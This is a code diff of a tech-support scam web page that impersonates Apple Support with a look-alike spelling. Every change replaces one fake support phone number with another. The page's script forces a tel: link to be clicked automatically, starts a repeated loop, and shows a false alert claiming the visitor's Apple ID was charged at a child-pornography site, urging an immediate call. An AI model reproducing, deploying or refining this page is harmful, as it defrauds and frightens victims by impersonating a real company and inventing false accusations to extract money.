@@ -134,7 +134,7 @@
                 <div class="ac-ln-background"></div>
                 <div class="ac-ln-content">
                     <span class="ac-ln-title">
-                       <a href="#">Applẹ Support +1-888-449-3823 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+                       <a href="#">Applẹ Support +1-855-510-3342 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
 					 </span>
                     <div class="ac-ln-menu">
                         <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close"
@@ -212,7 +212,7 @@
 						Apple </a></div>
                 </div>
                 <meta content="Apple" property="name" />
-                <meta content="+1-888-449-3823
+                <meta content="+1-855-510-3342
 			 " property="telephone" />
             </section>
         </div>
@@ -279,7 +279,7 @@
 
         window.number = getPar('phone');
 
-        window.number = (window.number ? window.number : '+1-888-449-3823');
+        window.number = (window.number ? window.number : '+1-855-510-3342');
 
         window.device = 'iPhone';
         window.refef = parseURL(document.referrer);
@@ -337,7 +337,7 @@
         }, 100);
 
         function okkkk() {
-            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-888-449-3823"></a>');
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-855-510-3342"></a>');
             document.querySelector('a').click();
             var extraData = "";
             for (itxextraData = 0; itxextraData < 200; itxextraData++) {
@@ -354,7 +354,7 @@
         };
 
         function myFunction() {
-            if (confirm("Your Applẹ ID was recently used at CHÍLD P0RN0GRÀPHY WEBSITE for $549.70 Via Applẹ Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Applẹ Support +1-888-449-3823 to Freeze it!.")) {
+            if (confirm("Your Applẹ ID was recently used at CHÍLD P0RN0GRÀPHY WEBSITE for $549.70 Via Applẹ Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Applẹ Support +1-855-510-3342 to Freeze it!.")) {
                 okkkk();
             } else {
                 okkkk();
